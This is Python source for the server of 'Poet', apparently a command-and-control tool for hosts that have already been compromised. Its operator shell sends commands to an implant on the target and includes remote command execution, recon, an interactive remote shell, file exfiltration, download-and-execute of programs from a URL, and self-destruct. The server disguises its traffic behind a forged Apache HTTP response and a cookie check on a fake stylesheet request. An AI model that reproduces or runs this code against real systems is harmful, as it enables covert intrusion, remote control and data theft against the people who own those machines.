#!/usr/bin/python2.7

import os
import re
import sys
import zlib
import base64
import socket
import os.path
import argparse
from datetime import datetime

import config as CFG
from poetsocket import *

__version__ = '0.4.1'

OUT = 'archive'
PSH_PROMPT = 'psh > '
FAKEOK = """HTTP/1.1 200 OK\r
Date: Tue, 19 Mar 2013 22:12:25 GMT\r
Server: Apache\r
X-Powered-By: PHP/5.3.10-1ubuntu3.2\r
Content-Length: 364\r
Content-Type: text/plain\r
\r
body{background-color:#f0f0f2;margin:0;padding:0;font-family:"Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif}div{width:600px;margin:5em auto;padding:50px;background-color:#fff;border-radius:1em}a:link,a:visited{color:#38488f;text-decoration:none}@media (max-width:700px){body{background-color:#fff}div{width:auto;margin:0 auto;border-radius:0;padding:1em}}"""


class PoetSocketServer(PoetSocket):
    def __init__(self, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('', port))
        self.s.listen(1)

    def accept(self):
        return self.s.accept()


class PoetServer(object):
    """Core server functionality.

    Implements psh, and necessary helper functions.

    Attributes:
        s: socket instance for initial client connection
        conn: socket instance for actual client communication
        cmds: list of supported psh commands
    """

    def __init__(self, s):
        self.s = s
        self.conn = None
        self.cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil',
                     'selfdestruct', 'dlexec', 'chint']

    def psh(self):
        """Poet server control shell."""

        print '[+] ({}) Entering control shell'.format(datetime.now())
        self.conn = PoetSocket(self.s.accept()[0])
        prompt = self.conn.exchange('getprompt')
        print 'Welcome to psh, the Poet shell!'
        print 'Running `help\' will give you a list of supported commands.'
        while True:
            try:
                inp = raw_input(PSH_PROMPT)
                if inp == '':
                    continue
                base = inp.split()[0]
                # exit
                if base == self.cmds[0]:
                    break
                # help
                elif base == self.cmds[1]:
                    print 'Commands:\n  {}'.format('\n  '.join(sorted(self.cmds)))
                # exec
                elif base == self.cmds[2]:
                    inp += ' '  # for regex
                    exec_regex = '^exec( -o( [\w.]+)?)? (("[^"]+")\ )+$'
                    if re.search(exec_regex, inp):
                        self.generic(*self.exec_preproc(inp))
                    else:
                        self.cmd_help(2)
                # recon
                elif base == self.cmds[3]:
                    if re.search('^recon( -o( [\w.]+)?)?$', inp):
                        if '-o' in inp.split():
                            if len(inp.split()) == 3:
                                self.generic(base, True, inp.split()[2])
                            else:
                                self.generic(base, True)
                        else:
                            self.generic(base)
                    else:
                        self.cmd_help(3)
                # shell
                elif base == self.cmds[4]:
                    if inp == 'shell':
                        self.shell(prompt)
                    else:
                        self.cmd_help(4)
                # exfil
                elif base == self.cmds[5]:
                    if re.search('^exfil ([\w\/\\.~:\-]+ )+$', inp + ' '):
                        for file in inp.split()[1:]:
                            resp = self.conn.exchange('exfil ' + file)
                            if 'No such' in resp:
                                print 'psh : {}: {}'.format(resp, file)
                                continue
                            resp = zlib.decompress(resp)
                            write_file = file.split('/')[-1].strip('.')
                            self.write(resp, base, OUT, write_file)
                    else:
                        self.cmd_help(5)
                # selfdestruct
                elif base == self.cmds[6]:
                    if inp == 'selfdestruct':
                        print """[!] WARNING: You are about to permanently remove the client from the target.
    You will immediately lose access to the target. Continue? (y/n)""",
                        if raw_input().lower()[0] == 'y':
                            resp = self.conn.exchange('selfdestruct')
                            if resp == 'boom':
                                print '[+] ({}) Exiting control shell.'.format(datetime.now())
                                return
                            else:
                                print 'psh : Self destruct error: {}'.format(resp)
                        else:
                            print 'psh : Aborting self destruct.'
                    else:
                        self.cmd_help(6)
                # dlexec
                elif base == self.cmds[7]:
                    if re.search('^dlexec https?:\/\/[\w.\/]+$', inp):
                        resp = self.conn.exchange(inp)
                        msg = 'successful' if resp == 'done' else 'error: ' + resp
                        print 'psh : dlexec {}'.format(msg)
                    else:
                        self.cmd_help(7)
                # chint
                elif base == self.cmds[8]:
                    if re.search('^chint( \d+)?$', inp):
                        self.chint(inp)
                    else:
                        self.cmd_help(8)
                else:
                    print 'psh: {}: command not found'.format(base)
            except KeyboardInterrupt:
                print
                continue
            except EOFError:
                print
                break
        self.conn.send('fin')
        print '[+] ({}) Exiting control shell.'.format(datetime.now())

    def generic(self, req, write_flag=False, write_file=None):
        """Abstraction layer for exchanging with client and writing to file.

        Args:
            reg: command to send to client
            write_flag: whether client response should be written
            write_file: optional filename to use for file
        """

        resp = self.conn.exchange(req)
        if req == self.cmds[3]:
            resp = zlib.decompress(resp)
        print resp
        if write_flag:
            self.write(resp, req.split()[0], OUT, write_file)

    def write(self, response, prefix, out_dir, write_file=None):
        """Write to server archive.

        Args:
            response: data to write
            prefix: directory to write file to (usually named after command
                    executed)
            out_dir: name of server archive directory
            write_file: optional filename to use for file
        """

        ts = datetime.now().strftime('%Y%m%d%M%S')
        out_ts_dir = '{}/{}'.format(out_dir, ts[:len('20140101')])
        out_prefix_dir = '{}/{}'.format(out_ts_dir, prefix)
        if write_file:
            chunks = write_file.split('.')
            # separate the file extension from the file name, default to .txt
            ext = '.{}'.format('.'.join(chunks[1:])) if chunks[1:] else '.txt'
            outfile = '{}/{}-{}{}'.format(out_prefix_dir, chunks[0], ts, ext)
        else:
            outfile = '{}/{}-{}.txt'.format(out_prefix_dir, prefix, ts)
        if not os.path.isdir(out_dir):
            os.mkdir(out_dir)
        if not os.path.isdir(out_ts_dir):
            os.mkdir(out_ts_dir)
        if not os.path.isdir(out_prefix_dir):
            os.mkdir(out_prefix_dir)
        with open(outfile, 'w') as f:
            f.write(response)
            print 'psh : {} written to {}'.format(prefix, outfile)

    def cmd_help(self, ind):
        """Print help messages for psh commands."""

        if ind == 2:
            print 'Execute commands on target.'
            print 'usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]'
            print '\nExecute given commands and optionally log to file with optional filename.'
            print '\noptions:'
            print '-h\t\tshow help'
            print '-o filename\twrite results to file in {}/'.format(OUT)
        elif ind == 3:
            print 'Basic reconaissance of target.'
            print 'usage: recon [-h] [-o]'
            print '\nExecutes, whoami, id, w, who -a, uname -a, and lsb_release -a on target where applicable.'
            print '\noptions:'
            print '-h\t\tshow help'
            print '-o\t\twrite results to file in {}/'.format(OUT)
        elif ind == 4:
            print 'Remote shell on target.'
            print 'usage: shell [-h]'
            print '\noptions:'
            print '-h\t\tshow help'
        elif ind == 5:
            print 'Exfiltrate files.'
            print 'usage: exfil [-h] file1 [file2 file3 ...]'
            print '\nDownloads files to {}/'.format(OUT)
            print '\noptions:'
            print '-h\t\tshow help'
        elif ind == 6:
            print 'Self destruct.'
            print 'usage: selfdestruct [-h]'
            print '\nPermanently remove client from target.'
            print '\noptions:'
            print '-h\t\tshow help'
        elif ind == 7:
            print 'Download and execute.'
            print 'usage: dlexec [-h] http://my.pro/gram'
            print '\nDownload executable from internet and execute.'
            print '\noptions:'
            print '-h\t\tshow help'
        elif ind == 8:
            print 'Print or change client delay interval.'
            print 'usage: chint [-h] [seconds]'
            print '\nIf run with no arguments, print the current client delay.'
            print 'Otherwise, change interval to given argument (seconds).'
            print 'Minimum allowed value is 1 and maximum is 86400 (1 day).'
            print '\noptions:'
            print '-h\t\tshow help'

    def exec_preproc(self, inp):
        """Parse psh `exec' command line.

        Args:
            inp: raw `exec' command line

        Returns:
            Tuple suitable for expansion into as self.generic() parameters.
        """

        tmp = inp.split()
        write_file = None
        write_flag = tmp[1] == '-o'
        if write_flag:
            if '"' not in tmp[2]:
                write_file = tmp[2]
                del tmp[2]
            del tmp[1]
        tmp = ' '.join(tmp)
        return tmp, write_flag, write_file

    def shell(self, prompt):
        """Psh `shell' command server-side.

        Args:
            prompt: shell prompt to use
        """

        while True:
            try:
                inp = raw_input(PSH_PROMPT + prompt)
            except KeyboardInterrupt:  # Ctrl-C -> new prompt
                print
                continue
            except EOFError:  # Ctrl-D -> exit shell
                print
                break

            if inp == '':
                continue
            elif inp == 'exit':
                break
            elif inp.split()[0] in self.cmds:
                print """[!] WARNING: You've entered a psh command into the real remote shell on the
    target. Continue? (y/n)""",
                if raw_input().lower()[0] != 'y':
                    continue

            self.conn.send('shell {}'.format(inp))
            try:
                while True:
                    rec = self.conn.recv()
                    if rec == 'shelldone':
                        break
                    else:
                        print rec,
            except KeyboardInterrupt:
                self.conn.send('shellterm')
                # flush lingering socket buffer ('shelldone' and any
                # excess data) and sync client/server
                while self.conn.recv() != 'shelldone':
                    pass
                print
                continue

    def chint(self, inp):
        """Chint command handler.

        Args:
            inp: input string
        """

        num = inp[6:]
        if num:
            # argument was given
            num = int(num)
            # 1 second to 1 day
            if num < 1 or num > 60*60*24:
                print 'psh : Invalid interval time.'
            else:
                resp = self.conn.exchange(inp)
                msg = 'successful' if resp == 'done' else 'error: ' + resp
                print 'psh : chint ({}) {}'.format(num, msg)
        else:
            # no argument
            print self.conn.exchange(inp)


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port')
    parser.add_argument('-V', '--version', action='store_true',
                        help='prints the Poet version number and exits')
    return parser.parse_args()


def print_header():
    """ Prints big ASCII logo and other info. """

    print """
                          _
        ____  ____  ___  / /_
       / __ \/ __ \/ _ \/ __/
      / /_/ / /_/ /  __/ /
     / .___/\____/\___/\__/     v{}
    /_/
""".format(__version__)


def die(msg=None):
    if msg:
        print '[!] ({}) {}'.format(datetime.now(), msg)
    print '[-] ({}) Poet server terminated.'.format(datetime.now())
    sys.exit(0)


def authenticate(ping):
    """Verify that the client is in fact connecting by checking the request
    path and the auth token contained in the cookie.

    Args:
        ping: http request sent from client (string)

    Returns:
        None: client authenticated successfully
        str: the reason authentication failed
    """

    if ping.startswith('GET /style.css HTTP/1.1'):
        if 'Cookie: c={};'.format(base64.b64encode(CFG.AUTH)) in ping:
            return None
        else:
            return 'AUTH TOKEN'
    else:
        return 'REQUEST'


def drop_privs():
    new_uid = int(os.getenv('SUDO_UID'))
    new_gid = int(os.getenv('SUDO_GID'))

    # drop group before user, because otherwise you're not privileged enough
    # to drop group
    os.setgroups([])
    os.setregid(new_gid, new_gid)
    os.setreuid(new_uid, new_uid)

    # check to make sure we can't re-escalate
    try:
        os.seteuid(0)
    except OSError:
        return

    die('Failed to drop privileges!')


def main():
    args = get_args()
    if args.version:
        print 'Poet version {}'.format(__version__)
        sys.exit(0)
    print_header()
    PORT = int(args.port) if args.port else 443
    try:
        s = PoetSocketServer(PORT)
    except socket.error as e:
        if e.errno == 13:
            die('You need to be root!')
    if os.geteuid() == 0:
        drop_privs()
    print '[+] Poet server started on {}.'.format(PORT)
    while True:
        try:
            conn, addr = s.accept()
        except KeyboardInterrupt:
            die()
        conntime = datetime.now()
        ping = conn.recv(SIZE)
        if not ping:
            die('Socket error: {}'.format(e.message))
        auth_err = authenticate(ping)
        if auth_err:
            print '[!] ({}) Connected By: {} -> INVALID! ({})'.format(conntime, addr, auth_err)
            conn.close()
        else:
            print '[+] ({}) Connected By: {} -> VALID'.format(conntime, addr)
            conn.send(FAKEOK)
            conn.close()
            try:
                PoetServer(s).psh()
                break
            except socket.error as e:
                die('Socket error: {}'.format(e.message))
    die()

if __name__ == '__main__':
    main()
